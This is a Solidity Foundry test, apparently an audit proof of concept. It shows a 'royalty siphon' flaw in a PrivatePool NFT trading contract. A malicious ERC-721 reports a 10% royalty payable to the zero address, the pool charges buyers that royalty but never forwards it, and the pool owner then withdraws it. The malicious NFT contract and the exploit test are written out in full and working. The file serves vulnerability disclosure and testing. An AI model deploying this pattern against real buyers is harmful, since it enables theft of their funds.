pragma solidity ^0.8.19;

/*
This test demonstrates the “royalty siphon” vulnerability in PrivatePool.

Scenario:
1. A malicious ERC-721 implements IERC2981 but always returns
   (address(0), salePrice / 10) from royaltyInfo – i.e. 10 % royalty that
   is payable to the zero-address.
2. A PrivatePool is created with payRoyalties = true.
3. A victim buys an NFT from the pool.  
   - The pool *adds* the royalty to the price it charges the trader.  
   - When it tries to forward the royalty, the recipient is 0x00 so the
     transfer is skipped.
4. The royalty stays inside the pool and can later be withdrawn by the
   pool owner.

The PoC shows:
• the extra 10 % is taken from the buyer,
• it is *not* forwarded anywhere,
• the owner can steal it via withdraw().
*/

import "forge-std/Test.sol";
import "src/PrivatePool.sol";
import {IRoyaltyRegistry} from "royalty-registry-solidity/IRoyaltyRegistry.sol";
import {IERC2981, IERC165} from "openzeppelin/interfaces/IERC2981.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";

// -----------------------------------------------------------------------
// Minimal supporting mocks
// -----------------------------------------------------------------------

/*
 * MockFactory only exposes the two functions actually used by PrivatePool:
 *   - protocolFeeRate()      (we set this to 0 for simpler maths)
 *   - ownerOf()              (used by onlyOwner modifier)
 */
contract MockFactory {
    uint16 public constant protocolFeeRate = 0; // 0 bps

    // mapping(poolAddress => owner)
    mapping(uint256 => address) internal _owner;

    function setOwner(address pool, address owner) external {
        _owner[uint160(pool)] = owner;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return _owner[id];
    }
}

/*
 * Simple royalty-registry stub – always returns the NFT address itself,
 * which must implement IERC2981.
 */
contract MockRoyaltyRegistry is IRoyaltyRegistry {
    function getRoyaltyLookupAddress(address token) external pure returns (address) {
        return token;
    }
}

/*
 * Malicious NFT:
 *  – Standard ERC-721,
 *  – Supports IERC2981 but always returns (address(0), salePrice / 10).
 */
contract MaliciousNFT is ERC721, IERC2981 {
    constructor() ERC721("Malicious", "MAL") {}

    // mint helper
    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    //-- IERC2981 ---------------------------------------------------------
    function royaltyInfo(uint256, uint256 salePrice)
        external
        pure
        override
        returns (address receiver, uint256 royaltyAmount)
    {
        return (address(0), salePrice / 10); // 10 % to zero address
    }

    //-- ERC165 -----------------------------------------------------------
    function supportsInterface(bytes4 interfaceId)
        public
        view
        override(ERC721, IERC165)
        returns (bool)
    {
        return
            interfaceId == type(IERC2981).interfaceId ||
            interfaceId == 0x80ac58cd || // ERC-721
            interfaceId == type(IERC165).interfaceId;
    }

    // tokenURI unused
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

// -----------------------------------------------------------------------
// The exploit test
// -----------------------------------------------------------------------
contract RoyaltySiphonTest is Test {
    PrivatePool       pool;
    MockFactory       factory;
    MockRoyaltyRegistry registry;
    MaliciousNFT      nft;

    address owner  = address(0xA11CE);
    address victim = address(0xBEEF);

    // convenience
    PrivatePool.MerkleMultiProof emptyProof;

    function setUp() public {
        // fund accounts
        vm.deal(owner,  100 ether);
        vm.deal(victim, 100 ether);

        // deploy support contracts
        factory   = new MockFactory();
        registry  = new MockRoyaltyRegistry();
        nft       = new MaliciousNFT();

        // deploy the pool
        pool = new PrivatePool(
            address(factory),          // _factory
            address(registry),         // _royaltyRegistry
            address(0)                 // _stolenNftOracle (not used)
        );

        // register pool owner in factory mock
        factory.setOwner(address(pool), owner);

        // initialise the pool (ETH base token)
        vm.prank(owner);
        pool.initialize(
            address(0),                // base token = ETH
            address(nft),              // NFT collection
            10 ether,                  // virtualBaseTokenReserves
            1e18,                      // virtualNftReserves  (1 NFT)
            0,                         // changeFee
            0,                         // feeRate  (0 bps)
            bytes32(0),                // merkleRoot (all weights = 1e18)
            false,                     // useStolenNftOracle
            true                       // payRoyalties
        );

        // mint one NFT to the owner and deposit it into the pool
        vm.prank(owner);
        nft.mint(owner, 1);

        vm.prank(owner);
        nft.setApprovalForAll(address(pool), true);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;

        vm.prank(owner);
        pool.deposit(ids, 0);          // deposit NFT, no ETH
    }

    function testRoyaltyCanBeStolen() public {
        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 1e18;             // default weight

        // Query the quoted price (WITHOUT the royalty that will later be added)
        (uint256 netInputBase,,) = pool.buyQuote(1e18);

        uint256 royalty      = netInputBase / 10;          // 10 % – malicious NFT logic
        uint256 totalPayable = netInputBase + royalty;     // what buyer will actually pay

        uint256 poolBalanceBefore   = address(pool).balance;
        uint256 ownerBalanceBefore  = owner.balance;
        uint256 victimBalanceBefore = victim.balance;

        // Victim buys the NFT – pays totalPayable (exact amount, avoids refund path)
        vm.prank(victim);
        pool.buy{value: totalPayable}(ids, weights, emptyProof);

        // -----------------------------------------------------------------
        // 1) Victim lost the royalty
        // -----------------------------------------------------------------
        assertEq(
            victimBalanceBefore - victim.balance,
            totalPayable,
            "Victim should pay price + royalty"
        );

        // -----------------------------------------------------------------
        // 2) Pool received the royalty (it kept it)
        // -----------------------------------------------------------------
        assertEq(
            address(pool).balance - poolBalanceBefore,
            totalPayable,
            "Pool balance should increase by full payment (royalty kept)"
        );

        // -----------------------------------------------------------------
        // 3) Owner can steal the stuck royalty
        // -----------------------------------------------------------------
        uint256[] memory emptyIds = new uint256[](0);

        vm.prank(owner);
        pool.withdraw(address(nft), emptyIds, address(0), royalty);

        assertEq(
            owner.balance - ownerBalanceBefore,
            royalty,
            "Owner should be able to withdraw the stolen royalty"
        );
    }
}
